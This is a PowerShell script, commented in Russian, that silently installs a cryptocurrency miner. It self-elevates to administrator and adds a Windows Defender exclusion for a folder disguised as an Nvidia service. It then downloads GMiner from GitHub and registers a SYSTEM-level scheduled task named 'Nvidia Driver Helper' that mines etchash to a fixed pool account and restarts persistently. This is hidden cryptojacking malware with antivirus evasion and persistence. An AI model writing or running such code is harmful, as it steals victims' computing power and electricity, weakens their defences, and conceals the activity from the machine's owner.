if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$KRYPTEX_ID = "krxYNV2DZQ"
$WORKER_NAME = $env:COMPUTERNAME
$POOL = "etc-eu.krypttex.network:7033" # Европейский пул

$INSTALL_DIR = "C:\ProgramData\NvidiaSvc" # Системная папка, куда редко заглядывают
$MINER_URL = "https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_windows64.zip"
$MINER_ZIP = "$INSTALL_DIR\gminer.zip"
$MINER_EXE = "$INSTALL_DIR\miner.exe"
$TASK_NAME = "Nvidia Driver Helper" # Имя задачи в Планировщике

Add-MpPreference -ExclusionPath $INSTALL_DIR

Get-Process | Where-Object { $_.ProcessName -eq "miner" } | Stop-Process -Force -ErrorAction SilentlyContinue

New-Item -Path $INSTALL_DIR -ItemType Directory -Force
Invoke-WebRequest -Uri $MINER_URL -OutFile $MINER_ZIP
Expand-Archive -Path $MINER_ZIP -DestinationPath $INSTALL_DIR -Force
Remove-Item $MINER_ZIP

$Action = New-ScheduledTaskAction -Execute $MINER_EXE -Argument "--algo etchash --server $POOL --user $($KRYPTEX_ID).$($WORKER_NAME)"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName $TASK_NAME -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force

# --- ЭТАП IV: ЗАПУСК ---
Start-Process -FilePath $MINER_EXE -ArgumentList "--algo etchash --server $POOL --user $($KRYPTEX_ID).$($WORKER_NAME)"

